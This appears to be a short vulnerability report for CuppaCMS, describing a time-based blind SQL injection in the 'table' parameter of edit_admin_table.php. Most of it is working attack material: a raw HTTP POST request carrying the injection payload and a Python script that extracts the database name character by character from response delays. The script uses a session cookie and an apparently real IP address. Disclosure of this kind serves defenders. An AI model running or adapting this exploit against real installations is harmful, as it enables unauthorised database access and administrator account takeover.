cuppacms is vulnerable to SQL Injection via components/table_manager/html/edit_admin_table.php.
The parameter tables is not sanitized correctly. The malicious actor can use this vulnerability to manipulate the administrator account of the systemand can take full control of the information about the other accounts.
```
POST /cuppa/components/table_manager/html/edit_admin_table.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://121.36.203.14/cuppa/components/table_manager/html/edit_admin_table.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
Origin: http://121.36.203.14
Connection: close
Cookie: PHPSESSID=sm4ssetquvmibali4j59p7jq3e; administrator_path=http%3A%2F%2F121.36.203.14%2Fcuppa%2F; administrator_document_path=%2Fcuppa%2F; country=CN; language=en
Upgrade-Insecure-Requests: 1

table=123'||(SELECT IF(ORD(SUBSTRING((SELECT DATABASE()), 1, 1)) =99,hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex('aaaaaaaaaaaa')))))))))))))))))))))))), 0))#
```
we can use time delay to get infotrmation and change the data to control the system

```
import requests
import time
url="http://xxx.xxx.xxx.xxx/cuppa/components/table_manager/html/edit_admin_table.php"
headers={
    "Cookie":"PHPSESSID=sm4ssetquvmibali4j59p7jq3e; administrator_path=http%3A%2F%2F121.36.203.14%2Fcuppa%2F; administrator_document_path=%2Fcuppa%2F; country=CN; language=en"
}
flag=''
for i in range(1,1000):
    for j in range(32,127):
        payload={
            "table":"123'||(SELECT IF(ORD(SUBSTRING((SELECT DATABASE()), {}, 1)) ={},hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex('aaaaaaaaaaaa')))))))))))))))))))))))), 0))#".format(i,j)
        }
        start = time.time()
        r=requests.post(url,data=payload,headers=headers)
        end = time.time() - start
        if end >3:
            flag+=chr(j)
            print(flag)
            break


```
